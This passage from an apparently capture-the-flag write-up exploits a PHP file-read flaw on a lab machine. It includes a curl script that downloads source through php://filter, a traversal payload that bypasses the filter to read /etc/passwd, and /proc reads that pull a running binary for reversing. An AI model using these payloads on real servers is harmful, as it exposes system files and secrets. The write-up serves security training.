</span></span><span style=display:flex><span>systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
</span></span><span style=display:flex><span>messagebus:x:104:105::/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>_chrony:x:105:112:Chrony daemon,,,:/var/lib/chrony:/usr/sbin/nologin
</span></span><span style=display:flex><span>sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
</span></span><span style=display:flex><span>vagrant:x:1000:1000::/vagrant:/bin/bash
</span></span><span style=display:flex><span>systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
</span></span><span style=display:flex><span>dev:x:1001:1001::/home/dev:/bin/bash
</span></span></code></pre></div><ul><li>Now I will create a simple bash script to automate the process of collecting <em>default.html, beta.html, activate_license.php, index.php</em> source code</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~
</span></span><span style=display:flex><span>❯ cat collectSourceCode.sh
</span></span><span style=display:flex><span><span style=color:#75715e>#!/bin/bash</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Check If Argument Available</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> -z $1 <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;[-] Usage: </span>$0<span style=color:#e6db74> &lt;Remote_IP&gt;&#34;</span>
</span></span><span style=display:flex><span>        exit
</span></span><span style=display:flex><span><span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Mahcine IP Address</span>
</span></span><span style=display:flex><span>IP<span style=color:#f92672>=</span>$1
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># Check If Loot directory Already Exist</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> <span style=color:#f92672>[</span> -d loot <span style=color:#f92672>]</span>; <span style=color:#66d9ef>then</span>
</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;[+] Loot Directory Already Exists&#34;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>        mkdir loot
</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;[+] Loot Directory Created&#34;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>fi</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;[+] Loot Files Will Be Saved To: &#34;</span> <span style=color:#66d9ef>$(</span>pwd<span style=color:#66d9ef>)</span>/loot
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>files<span style=color:#f92672>=(</span><span style=color:#e6db74>&#34;default.html&#34;</span> <span style=color:#e6db74>&#34;beta.html&#34;</span> <span style=color:#e6db74>&#34;activate_license.php&#34;</span> <span style=color:#e6db74>&#34;index.php&#34;</span><span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> f in <span style=color:#e6db74>${</span>files[@]<span style=color:#e6db74>}</span>;<span style=color:#66d9ef>do</span>
</span></span><span style=display:flex><span>        echo <span style=color:#e6db74>&#34;[+] Downloading: </span>$f<span style=color:#e6db74>&#34;</span>
</span></span><span style=display:flex><span>        curl <span style=color:#e6db74>&#34;http://</span>$IP<span style=color:#e6db74>/index.php?page=php://filter/resource=</span>$f<span style=color:#e6db74>&#34;</span> -o loot/$f
</span></span><span style=display:flex><span><span style=color:#66d9ef>done</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>echo <span style=color:#e6db74>&#34;[~] Done, Bye :)&#34;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~
</span></span><span style=display:flex><span>❯ ./collectSourceCode.sh 10.10.11.154
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Loot Directory Created
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Loot Files Will Be Saved To:  /home/xh41/loot
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Downloading: default.html
</span></span><span style=display:flex><span>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span style=display:flex><span>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span style=display:flex><span><span style=color:#ae81ff>100</span> <span style=color:#ae81ff>11414</span>    <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>11414</span>    <span style=color:#ae81ff>0</span>     <span style=color:#ae81ff>0</span>  <span style=color:#ae81ff>84040</span>      <span style=color:#ae81ff>0</span> --:--:-- --:--:-- --:--:-- <span style=color:#ae81ff>84548</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Downloading: beta.html
</span></span><span style=display:flex><span>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span style=display:flex><span>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span style=display:flex><span><span style=color:#ae81ff>100</span>  <span style=color:#ae81ff>4144</span>    <span style=color:#ae81ff>0</span>  <span style=color:#ae81ff>4144</span>    <span style=color:#ae81ff>0</span>     <span style=color:#ae81ff>0</span>  <span style=color:#ae81ff>44852</span>      <span style=color:#ae81ff>0</span> --:--:-- --:--:-- --:--:-- <span style=color:#ae81ff>45043</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Downloading: activate_license.php
</span></span><span style=display:flex><span>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span style=display:flex><span>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span style=display:flex><span><span style=color:#ae81ff>100</span>   <span style=color:#ae81ff>585</span>    <span style=color:#ae81ff>0</span>   <span style=color:#ae81ff>585</span>    <span style=color:#ae81ff>0</span>     <span style=color:#ae81ff>0</span>   <span style=color:#ae81ff>3061</span>      <span style=color:#ae81ff>0</span> --:--:-- --:--:-- --:--:--  <span style=color:#ae81ff>3078</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Downloading: index.php
</span></span><span style=display:flex><span>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span style=display:flex><span>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span style=display:flex><span><span style=color:#ae81ff>100</span>   <span style=color:#ae81ff>348</span>    <span style=color:#ae81ff>0</span>   <span style=color:#ae81ff>348</span>    <span style=color:#ae81ff>0</span>     <span style=color:#ae81ff>0</span>   <span style=color:#ae81ff>1814</span>      <span style=color:#ae81ff>0</span> --:--:-- --:--:-- --:--:--  <span style=color:#ae81ff>1821</span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>~<span style=color:#f92672>]</span> Done, Bye :<span style=color:#f92672>)</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># Files Downloaded</span>
</span></span><span style=display:flex><span>~
</span></span><span style=display:flex><span>❯ tree loot
</span></span><span style=display:flex><span>loot
</span></span><span style=display:flex><span>├── activate_license.php
</span></span><span style=display:flex><span>├── beta.html
</span></span><span style=display:flex><span>├── default.html
</span></span><span style=display:flex><span>└── index.php
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#ae81ff>0</span> directories, <span style=color:#ae81ff>4</span> files
</span></span></code></pre></div><ul><li><em>Note:</em> the vulnerability we exploited is not a file inclusion vulnerability, it&rsquo;s a file read vuln <code>readfile</code></li></ul><h4 id=collected-files-analysis>Collected Files Analysis:</h4><ul><li><em>index.php</em>:</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>// index.php
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>function</span> <span style=color:#a6e22e>sanitize_input</span>($param) {
</span></span><span style=display:flex><span>    $param1 <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#34;../&#34;</span>,<span style=color:#e6db74>&#34;&#34;</span>,$param);
</span></span><span style=display:flex><span>    $param2 <span style=color:#f92672>=</span> <span style=color:#a6e22e>str_replace</span>(<span style=color:#e6db74>&#34;./&#34;</span>,<span style=color:#e6db74>&#34;&#34;</span>,$param1);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> $param2;
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>$page <span style=color:#f92672>=</span> $_GET[<span style=color:#e6db74>&#39;page&#39;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($page) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/^[a-z]/&#34;</span>, $page)) {
</span></span><span style=display:flex><span>    $page <span style=color:#f92672>=</span> <span style=color:#a6e22e>sanitize_input</span>($page);
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#39;Location: /index.php?page=default.html&#39;</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>readfile</span>($page);
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><ul><li>By analysing <em>index.php</em>, i discoved that i bypassed the filter by incident :)</li><li>sanitize_input($param) analysis: this function replace ./ and ../ with empty string. the following payload will bypasss this filter: <code>.....///.....///.....///.....///.....///etc/passwd</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>php &gt; $param <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;.....///.....///.....///.....///.....///etc/passwd&#39;</span>;
</span></span><span style=display:flex><span>php &gt; $param1 <span style=color:#f92672>=</span> str_replace<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;../&#34;</span>,<span style=color:#e6db74>&#34;&#34;</span>,$param<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>php &gt; $param2 <span style=color:#f92672>=</span> str_replace<span style=color:#f92672>(</span><span style=color:#e6db74>&#34;./&#34;</span>,<span style=color:#e6db74>&#34;&#34;</span>,$param1<span style=color:#f92672>)</span>;
</span></span><span style=display:flex><span>php &gt; echo $param2;
</span></span><span style=display:flex><span>../../../../../etc/passwd
</span></span></code></pre></div><ul><li><p>The payload is not complete till now. We need to bypass this regex: <code>preg_match("/^[a-z]/", $page)</code>, this regex insists that the first chracter of the <code>$page</code> need to be a charcter from [a-z].</p></li><li><p>Final Payload: <code>a.....///.....///.....///.....///.....///etc/passwd</code></p></li><li><p><em>activate_license.php</em>:</p></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e># activate_license.php
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_FILES[<span style=color:#e6db74>&#39;licensefile&#39;</span>])) {
</span></span><span style=display:flex><span>    $license      <span style=color:#f92672>=</span> <span style=color:#a6e22e>file_get_contents</span>($_FILES[<span style=color:#e6db74>&#39;licensefile&#39;</span>][<span style=color:#e6db74>&#39;tmp_name&#39;</span>]);
</span></span><span style=display:flex><span>    $license_size <span style=color:#f92672>=</span> $_FILES[<span style=color:#e6db74>&#39;licensefile&#39;</span>][<span style=color:#e6db74>&#39;size&#39;</span>];
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    $socket <span style=color:#f92672>=</span> <span style=color:#a6e22e>socket_create</span>(<span style=color:#a6e22e>AF_INET</span>, <span style=color:#a6e22e>SOCK_STREAM</span>, <span style=color:#a6e22e>SOL_TCP</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>$socket) { <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;error socket_create()</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>; }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span><span style=color:#a6e22e>socket_connect</span>($socket, <span style=color:#e6db74>&#39;127.0.0.1&#39;</span>, <span style=color:#ae81ff>1337</span>)) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;error socket_connect()&#34;</span> <span style=color:#f92672>.</span> <span style=color:#a6e22e>socket_strerror</span>(<span style=color:#a6e22e>socket_last_error</span>()) <span style=color:#f92672>.</span> <span style=color:#e6db74>&#34;</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>socket_write</span>($socket, <span style=color:#a6e22e>pack</span>(<span style=color:#e6db74>&#34;N&#34;</span>, $license_size));
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>socket_write</span>($socket, $license);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>socket_shutdown</span>($socket);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>socket_close</span>($socket);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><ul><li>By analyzing the <em>activate_license.php</em> code. We can conclude that the submited file will be sent to a local process listning on port <code>1337</code></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e># socket object created
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>socket_connect</span>($socket, <span style=color:#e6db74>&#39;127.0.0.1&#39;</span>, <span style=color:#ae81ff>1337</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># send the file size
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>socket_write</span>($socket, <span style=color:#a6e22e>pack</span>(<span style=color:#e6db74>&#34;N&#34;</span>, $license_size));
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># send the file content
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#a6e22e>socket_write</span>($socket, $license);
</span></span></code></pre></div><ul><li>To get the process listning on port <code>1337</code>. We wil use a simple trick: we will request the following special file on linux: <code>/proc/sched_debug</code></li><li><code>/proc/sched_debug</code> : This special file contains a list of process running on the system</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~
</span></span><span style=display:flex><span>❯ curl http://10.10.11.154/index.php<span style=color:#ae81ff>\?</span>page<span style=color:#ae81ff>\=</span>php://filter/resource<span style=color:#ae81ff>\=</span>/proc/sched_debug
</span></span><span style=display:flex><span>Sched Debug Version: v0.11, 5.10.0-11-amd64 <span style=color:#75715e>#1</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>......
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>runnable tasks:
</span></span><span style=display:flex><span> S            task   PID         tree-key  switches  prio     wait-time             sum-exec        sum-sleep
</span></span><span style=display:flex><span>-------------------------------------------------------------------------------------------------------------
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>........
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>S activate_licens   <span style=color:#ae81ff>411</span>     15071.602333         <span style=color:#ae81ff>9</span>   <span style=color:#ae81ff>120</span>         0.000000         1.852602         0.000000 <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span> /
</span></span><span style=display:flex><span> S            cron   <span style=color:#ae81ff>412</span>     35611.351366       <span style=color:#ae81ff>276</span>   <span style=color:#ae81ff>120</span>         0.000000        52.059113         0.000000 <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span> /
</span></span><span style=display:flex><span> S        rsyslogd   <span style=color:#ae81ff>418</span>     35157.743823        <span style=color:#ae81ff>51</span>   <span style=color:#ae81ff>120</span>         0.000000         3.971595         0.000000 <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span> /
</span></span><span style=display:flex><span> S       in:imklog   <span style=color:#ae81ff>427</span>     33342.408519        <span style=color:#ae81ff>11</span>   <span style=color:#ae81ff>120</span>         0.000000         1.892979         0.000000 <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span> /
</span></span><span style=display:flex><span> S   rs:main Q:Reg   <span style=color:#ae81ff>429</span>     35611.332270      <span style=color:#ae81ff>3333</span>   <span style=color:#ae81ff>120</span>         0.000000        92.945178         0.000000 <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span> /
</span></span><span style=display:flex><span> S          hwmon1   <span style=color:#ae81ff>508</span>      3588.766100         <span style=color:#ae81ff>2</span>   <span style=color:#ae81ff>120</span>         0.000000         0.018254         0.000000 <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span> /
</span></span><span style=display:flex><span> S          agetty   <span style=color:#ae81ff>577</span>      8758.342870         <span style=color:#ae81ff>9</span>   <span style=color:#ae81ff>120</span>         0.000000         4.459420         0.000000 <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span> /
</span></span><span style=display:flex><span> S            sshd   <span style=color:#ae81ff>579</span>     11203.112158        <span style=color:#ae81ff>44</span>   <span style=color:#ae81ff>120</span>         0.000000        18.451294         0.000000 <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span> /
</span></span><span style=display:flex><span> S           nginx   <span style=color:#ae81ff>581</span>     35622.723457       <span style=color:#ae81ff>211</span>   <span style=color:#ae81ff>120</span>         0.000000        38.343570         0.000000 <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span> /
</span></span><span style=display:flex><span> S           nginx   <span style=color:#ae81ff>582</span>     31556.512427        <span style=color:#ae81ff>15</span>   <span style=color:#ae81ff>120</span>         0.000000         3.710789         0.000000 <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span> /
</span></span><span style=display:flex><span> S      php-fpm7.4   <span style=color:#ae81ff>583</span>     35342.638077        <span style=color:#ae81ff>59</span>   <span style=color:#ae81ff>120</span>         0.000000        12.122552         0.000000 <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span> /
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>........
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># From this process name it&#39;s clear that this is the process used for activate license</span>
</span></span><span style=display:flex><span> S activate_licens   <span style=color:#ae81ff>411</span>     15071.602333         <span style=color:#ae81ff>9</span>   <span style=color:#ae81ff>120</span>         0.000000         1.852602         0.000000 <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>0</span> /
</span></span></code></pre></div><ul><li>We will download the process binary and command line arguments using the following files <a href=https://tldp.org/LDP/Linux-Filesystem-Hierarchy/html/proc.html>reference</a>:<ul><li><code>/proc/411/cmdline</code>: Command line arguments.</li><li><code>/proc/411/exe</code>: Link to the executable of this process.</li></ul></li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~
</span></span><span style=display:flex><span>❯ curl <span style=color:#e6db74>&#34;http://10.10.11.154/index.php?page=php://filter/resource=/proc/411/cmdline&#34;</span> -o cmdline_activate
</span></span><span style=display:flex><span>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span style=display:flex><span>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span style=display:flex><span><span style=color:#ae81ff>100</span>    <span style=color:#ae81ff>31</span>    <span style=color:#ae81ff>0</span>    <span style=color:#ae81ff>31</span>    <span style=color:#ae81ff>0</span>     <span style=color:#ae81ff>0</span>    <span style=color:#ae81ff>187</span>      <span style=color:#ae81ff>0</span> --:--:-- --:--:-- --:--:--   <span style=color:#ae81ff>189</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>~
</span></span><span style=display:flex><span>❯ curl <span style=color:#e6db74>&#34;http://10.10.11.154/index.php?page=php://filter/resource=/proc/411/exe&#34;</span> -o activate_licens
</span></span><span style=display:flex><span>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
</span></span><span style=display:flex><span>                                 Dload  Upload   Total   Spent    Left  Speed
</span></span><span style=display:flex><span><span style=color:#ae81ff>100</span> <span style=color:#ae81ff>22536</span>    <span style=color:#ae81ff>0</span> <span style=color:#ae81ff>22536</span>    <span style=color:#ae81ff>0</span>     <span style=color:#ae81ff>0</span>  <span style=color:#ae81ff>96500</span>      <span style=color:#ae81ff>0</span> --:--:-- --:--:-- --:--:-- <span style=color:#ae81ff>96721</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>~
</span></span><span style=display:flex><span>❯ ls -alh activate_licens cmdline_activate
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> xh41 xh41 23K Dec  <span style=color:#ae81ff>8</span> 01:26 activate_licens
</span></span><span style=display:flex><span>-rw-r--r-- <span style=color:#ae81ff>1</span> xh41 xh41  <span style=color:#ae81ff>31</span> Dec  <span style=color:#ae81ff>8</span> 01:26 cmdline_activate
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~
</span></span><span style=display:flex><span>❯ cat cmdline_activate
</span></span><span style=display:flex><span>/usr/bin/activate_license <span style=color:#ae81ff>1337</span> <span style=color:#75715e># the port used by</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>~
</span></span><span style=display:flex><span>❯ file activate_licens
</span></span><span style=display:flex><span>activate_licens: ELF 64-bit LSB pie executable, x86-64, version <span style=color:#ae81ff>1</span> <span style=color:#f92672>(</span>SYSV<span style=color:#f92672>)</span>, dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID<span style=color:#f92672>[</span>sha1<span style=color:#f92672>]=</span>554631debe5b40be0f96cabea315eedd2439fb81, <span style=color:#66d9ef>for</span> GNU/Linux 3.2.0, with debug_info, not stripped
</span></span></code></pre></div><h4 id=start-the-fun-reversing-activate_licens-binary-file>Start the fun: reversing <code>activate_licens</code> binary file</h4><ul><li>Fire up ghidra or IDA: and let&rsquo;s go:</li><li>Main function: Pseudo-code</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-C data-lang=C><span style=display:flex><span><span style=color:#75715e># main function
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>int</span> <span style=color:#66d9ef>__cdecl</span> __noreturn <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv, <span style=color:#66d9ef>const</span> <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>envp)
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>v3; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>v4; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>v5; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>v6; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>v7; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>v8; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> <span style=color:#f92672>*</span>v9; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>v10; <span style=color:#75715e>// rax
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span> clientaddr_s[<span style=color:#ae81ff>16</span>]; <span style=color:#75715e>// [rsp+10h] [rbp-50h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  sockaddr_in clientaddr; <span style=color:#75715e>// [rsp+20h] [rbp-40h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>socklen_t</span> clientaddrlen; <span style=color:#75715e>// [rsp+3Ch] [rbp-24h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  sockaddr_in server; <span style=color:#75715e>// [rsp+40h] [rbp-20h] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>uint16_t</span> port; <span style=color:#75715e>// [rsp+56h] [rbp-Ah] BYREF
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> clientfd; <span style=color:#75715e>// [rsp+58h] [rbp-8h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>int</span> serverfd; <span style=color:#75715e>// [rsp+5Ch] [rbp-4h]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( argc <span style=color:#f92672>!=</span> <span style=color:#ae81ff>2</span> )
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>error</span>(<span style=color:#e6db74>&#34;specify port to bind to&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( (<span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span>)<span style=color:#a6e22e>__isoc99_sscanf</span>(argv[<span style=color:#ae81ff>1</span>], <span style=color:#e6db74>&#34;%hu&#34;</span>, <span style=color:#f92672>&amp;</span>port) <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    v3 <span style=color:#f92672>=</span> <span style=color:#a6e22e>__errno_location</span>();
</span></span><span style=display:flex><span>    v4 <span style=color:#f92672>=</span> <span style=color:#a6e22e>strerror</span>(<span style=color:#f92672>*</span>v3);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>error</span>(v4);
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#a6e22e>printf</span>(<span style=color:#e6db74>&#34;[+] starting server listening on port %d</span><span style=color:#ae81ff>\n</span><span style=color:#e6db74>&#34;</span>, port);
</span></span><span style=display:flex><span>  server.sin_family <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>;
</span></span><span style=display:flex><span>  server.sin_addr.s_addr <span style=color:#f92672>=</span> <span style=color:#a6e22e>htonl</span>(<span style=color:#ae81ff>0x7F000001u</span>);
</span></span><span style=display:flex><span>  server.sin_port <span style=color:#f92672>=</span> <span style=color:#a6e22e>htons</span>(port);
</span></span><span style=display:flex><span>  serverfd <span style=color:#f92672>=</span> <span style=color:#a6e22e>socket</span>(<span style=color:#ae81ff>2</span>, <span style=color:#ae81ff>1</span>, <span style=color:#ae81ff>6</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> ( serverfd <span style=color:#f92672>==</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> )
</span></span><span style=display:flex><span>  {
</span></span><span style=display:flex><span>    v5 <span style=color:#f92672>=</span> <span style=color:#a6e22e>__errno_location</span>();
</span></span><span style=display:flex><span>    v6 <span style=color:#f92672>=</span> <span style=color:#a6e22e>strerror</span>(<span style=color:#f92672>*</span>v5);
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>error</span>(v6);
</span></span><span style=display:flex><span>  }
